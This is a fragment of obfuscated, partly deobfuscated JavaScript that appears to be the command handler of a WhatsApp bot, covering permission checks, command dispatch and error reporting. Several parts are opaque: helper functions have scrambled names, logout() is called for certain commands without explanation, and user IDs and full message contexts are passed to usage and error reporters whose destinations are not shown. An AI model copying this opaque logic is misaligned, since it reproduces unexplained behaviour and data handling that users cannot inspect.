              helpers.utQfO(index.cached[find.name].gid, key.remoteJid) &&
              (helpers.oAcsf(index.cached[find.name].uid, msgCtx.participant) ||
                msgCtx.fromMe ||
                isSudo)
            ) {
              msgCtx.text = helpers.YRJDA(
                libConfig[msgCtx.session].PREFIX,
                index.cached[find.name].text,
              );
              delete index.cached[find.name];
              msgCtx.message = null;
              msgCtx.fakeQuoted = {
                key: {
                  participant: helpers.oGLtV,
                  remoteJid: helpers.hrzBx,
                },
                message: {
                  extendedTextMessage: {
                    text: find.name,
                  },
                },
              };
            }
          }
        }
        const pnr = botState.pnr;
        const commandTable =
          msgCtx.isGroup || helpers.qbHmW(msgCtx.participant, index.numToJid(OWNER_NUMBER))
            ? libConfig[botState.id].cammands
            : libConfig[botState.id].pammands;
        const isOwnerChat =
          !msgCtx.isGroup && helpers.utQfO(msgCtx.participant, index.numToJid(OWNER_NUMBER));
        const isGroupAdminMode =
          msgCtx.isGroup &&
          msgCtx.admin &&
          !isSudo &&
          libConfig[msgCtx.session].adminsjid.includes(msgCtx.participant);
        const activeMenu = isGroupAdminMode
          ? await index.getAmenu(msgCtx.key.remoteJid, msgCtx.session)
          : null;
        const isIgnoredGroupBlocked =
          IGNORED_GROUPS.includes(key.remoteJid) &&
          !libConfig[msgCtx.session].TEMP_SUDO.includes(OWNER_NUMBER) &&
          !process.env.pqrs;
        const setCommandReaction = async (index, fS) => {
          if (helpers.CXTZb(helpers.vMJOC, libConfig[msgCtx.session].env.CMD_REACTION)) {
            if (1 !== index) {
              await client.queue.push({
                type: helpers.fFTpI,
                chat: key.remoteJid,
                message: {
                  react: {
                    text: MENTION_STATUS_ICONS[index],
                    key,
                  },
                },
              });
            }
            if (fS) {
              helpers.vXHGP(
                setTimeout,
                () => {
                  setCommandReaction(3, false);
                },
                5000,
              );
            }
          }
        };
        if (isDebugRestart) {
          index.logger.info(
            '[Handler] Command matching: text="' +
              msgCtx.text?.slice(0, 30) +
              '", r.E=' +
              botState.E +
              ", isSudo=" +
              isSudo +
              ", commandCount=" +
              Object.keys(commandTable).length,
          );
        }
        for (const commandName in commandTable) {
          const command = commandTable[commandName];
          AFK_RE.test(commandName);
          if (command.active) {
            const patternMatched =
              command.pattern && command.pattern.test(msgCtx.text) && botState.E;
            if (!patternMatched && command.pattern) {
              continue;
            }
            const isAdminMenuMatch = isGroupAdminMode && true === patternMatched;
            const contextAllowsRun =
              (!msgCtx.isBot && patternMatched) || (flag2 && msgCtx.isBot && patternMatched);
            const isWriteableCommand = command.fromMe == WRITEABLE;
            const hasPermission =
              (isWriteableCommand && (isFromMe || isSudo || pnr || isAdminMenuMatch)) ||
              (isWriteableCommand &&
                allowedCommands &&
                allowedCommands.has(command.name) &&
                !ALLOWLIST_EXCLUDED_COMMANDS.includes(command.name)) ||
              (isWriteableCommand &&
                isGroupAdminMode &&
                activeMenu &&
                activeMenu.includes(command.name) &&
                !ALLOWLIST_EXCLUDED_COMMANDS.includes(command.name));
            const isInvoked = patternMatched && hasPermission && true === contextAllowsRun;
            const isPassiveInvoked =
              !flag &&
              command.on &&
              !command.pattern &&
              isFromMe == isWriteableCommand &&
              (helpers.vMJOC === process.env.WEB || !isFromMe || !isWebPlatform);
            if (command.pattern && 0 == command.fromMe) {
              logout();
            }
            const willExecute =
              true === isInvoked ||
              helpers.rpxfH(true, isOwnerChat && patternMatched && isWriteableCommand);
            const isEventMatch =
              helpers.ozaOA === command.on && command.event_action === msgCtx.event_action;
            if (
              (true === willExecute || true === isPassiveInvoked || true === isEventMatch) &&
              !isIgnoredGroupBlocked &&
              index.formatter.n
            ) {
              const payload = {
                text: index.lang.extra.group_cmd,
              };
              if (command.onlyGroup && !msgCtx.isGroup && command.pattern) {
                return await client.queue.push({
                  type: helpers.fFTpI,
                  chat: msgCtx.key.remoteJid,
                  message: payload,
                });
              }
              if ((command.onlyGroup && msgCtx.isGroup) || !command.onlyGroup) {
                const g3 = msgCtx.text && command.pattern ? msgCtx.text.match(command.pattern) : "";
                if (command.pattern) {
                  await setCommandReaction(0, false);
                }
                try {
                  let message = new Message(handlerSock, msgCtx, !!command.pattern, sock);
                  await command.function(
                    message,
                    (g3 &&
                      (6 == g3.length
                        ? undefined === g3[3]
                          ? g3[4]
                          : g3[3]
                        : undefined === g3[2]
                          ? g3[3]
                          : g3[2])) ||
                      "",
                    sessionConfig,
                  );
                  if (process.env.LEVANTER_TEST) {
                    console.log(helpers.SbbUG);
                  }
                  if (command.pattern) {
                    helpers.mYAlj(
                      reportCommandUsage,
                      msgCtx.participant || key.remoteJid,
                      command.name,
                      msgCtx.isGroup,
                    );
                    await setCommandReaction(1, true);
                  }
                  message = null;
                } catch (error) {
                  if (command.pattern) {
                    await setCommandReaction(2, true);
                  }
                  const name = command.name;
                  const errorMessage = helpers.aCmNt(helpers.Rdcoq, typeof error.message)
                    ? JSON.stringify(error.message)
                    : error.message || error;
                  index.logger.error(error, error.stack);
                  helpers.ivbtN(
                    buildErrorPayload,
                    msgCtx.participant || key.remoteJid,
                    name,
                    error.stack + "\nMessage: " + JSON.stringify(msgCtx),
                  );
                  let errorText = index.lang.extra.error_message.format(
                    config.VERSION,
                    msgCtx.text,
                    errorMessage,
                    key.remoteJid,
                    name,
                    index.PLATFORM,
                  );
                  const errorBody = {
                    text: errorText,
                  };
                  const quotedEntry = {
                    key,
                    message,
                  };
                  const quotedOptions = {
                    quoted: quotedEntry,
                  };
                  const errorPayload = {
                    type: helpers.fFTpI,
                    chat: bot,
                    message: errorBody,
                    options: quotedOptions,
                  };
                  client.queue.push(errorPayload);
                }
              }
            }
          }
        }
        if (isDebugRestart) {
          index.logger.info("[Handler] Completed successfully for msg " + key?.id?.slice(-8));
        }
      } catch (error) {
        if (helpers.vMJOC === process.env.DEBUG_RESTART) {
          index.logger.error(
            "[Handler] Error processing msg " + key?.id?.slice(-8) + ": " + error.message,
          );
        }
        index.logger.error(
          {
            error: error.message,
            stack: error.stack,
            messageId: key?.id,
            remoteJid: key?.remoteJid,
            messageType: helpers.RRpNJ(getContentType, normalizeMessageContent(message)),
          },
          helpers.FFnTU,
        );
        if (bot && helpers.vMJOC === config.ERROR_NOTIFY) {
          try {
            const payload = {
              text: "⚠️ Handler Error:\n" + error.message,
            };
            const payload2 = {
              type: helpers.fFTpI,
              chat: bot,
              message: payload,
            };
            await client.queue.push(payload2);
          } catch (error) {
            index.logger.error(error, helpers.IXhdw);
          }
        }
      }
    }
  };
}
